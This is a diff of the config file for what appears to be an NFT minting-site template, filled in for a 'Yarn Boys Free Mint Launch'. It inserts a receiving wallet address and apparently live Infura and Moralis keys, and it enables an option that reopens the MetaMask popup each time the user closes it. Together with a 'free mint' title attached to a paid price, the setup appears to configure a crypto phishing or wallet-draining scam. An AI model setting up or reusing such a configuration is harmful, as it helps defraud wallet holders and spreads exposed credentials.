@@ -1,11 +1,11 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x94d5464dC200e25E9299f215478921314217433C";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "ffcf7a029fae49f3ad1c41136a926434"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "M9rgfOUnpXY4eYIsEsLlRKlvgkfpDsN0OD0y2aHvmKVBfmjmrB09P9rBys19N1O1"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    name: "YARN BOYS",
+    title: "Yarn Boys Free Mint Launch", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "XX.XX.XXXX", // Today date
     socialMedia: {
         discord: "https://discord.gg/example",
@@ -23,8 +23,8 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
-    totalSupply: 999,   // Total supply of NFTs.
+    price: 0.05,         // Price per NFT.
+    totalSupply: 333,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
